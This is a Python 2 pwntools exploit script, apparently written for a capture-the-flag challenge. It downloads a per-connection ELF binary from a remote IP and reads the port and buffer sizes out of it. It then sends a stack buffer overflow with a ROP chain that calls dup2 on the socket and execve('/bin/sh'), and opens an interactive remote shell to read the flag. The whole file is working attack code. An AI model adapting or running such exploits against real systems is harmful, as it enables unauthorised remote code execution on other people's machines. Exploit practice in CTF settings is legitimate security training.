#!/usr/bin/python2

from pwn import *

# libc-relative, but precalculated
system_addr = 0x7ffff7a5b640
binsh = 0x7ffff7b91cdb
empty = 0x00007FFFF7B91CE2
dup2_libc = 0x7ffff7b00fe0
syscall = 0x7ffff7ad6e65

# .text
pop_rdi = 0x00000000004008d3 #: pop rdi ; ret


# libc-relative stuff
libc_base = 0x7ffff7a15000

pop_rsi = 0x0000000000024805 #: pop rsi ; ret
pop_rax = 0x000000000001b218 #: pop rax ; ret
pop_rdx = 0x0000000000001b8e #: pop rdx ; ret

pop_rsi += libc_base
pop_rax += libc_base
pop_rdx += libc_base

ropchain = str()
# dup2() a buncha shit :)
# dup2(6,1)
ropchain += p64(pop_rsi) + p64(1)
ropchain += p64(pop_rdi) + p64(6)
ropchain += p64(dup2_libc) 
# dup2(6,0)
ropchain += p64(pop_rsi) + p64(0)
ropchain += p64(dup2_libc) 
ropchain += p64(pop_rax) + p64(59)
ropchain += p64(pop_rdi) + p64(binsh)
ropchain += p64(pop_rdx) + p64(0)
ropchain += p64(syscall)  

readsz = 0
payload = "a"
remote_host = '52.20.10.244'
remote_port = 8888

while(len(payload) >= readsz):

  p = remote(remote_host, remote_port)

  elf_recv = p.recvall()
  elf_file = open("./out_run", "wb")
  elf_file.write(elf_recv)
  elf_file.close()
  log.info("grabbed our elf")
  e = ELF("./out_run")

  port_raw = e.read(e.address+0x7d5, 4)
  port  = ord(port_raw[1]) << 8
  port |= ord(port_raw[0])
  log.info("port = " + str(port))

  stack_raw = e.read(e.address+0x784, 2)
  stack  = ord(stack_raw[1]) << 8
  stack |= ord(stack_raw[0]) 
  log.info("stack size = " + str(stack))

  readsz_raw = e.read(e.address+0x82f, 4)
  readsz  = ord(readsz_raw[3]) << 24
  readsz |= ord(readsz_raw[2]) << 16
  readsz |= ord(readsz_raw[1]) << 8
  readsz |= ord(readsz_raw[0]) 
  log.info("read size = " + str(readsz))

  # lol heuristics?
  if readsz > 23032586:
    readsz = 0
    continue
  if stack > 23032586:
    readsz = 0
    continue


  p.shutdown()
  p = remote(remote_host, port)

  if not (readsz > stack):
    readsz = 0
    continue

  payload = "A"*(stack-8) + ropchain + p64(0xdeadbeefcafebabe)
  log.info("payload size = " + str(len(payload)))
  p.sendline(payload + "\ncat flag\n")
  p.sendline('id')
  p.interactive()
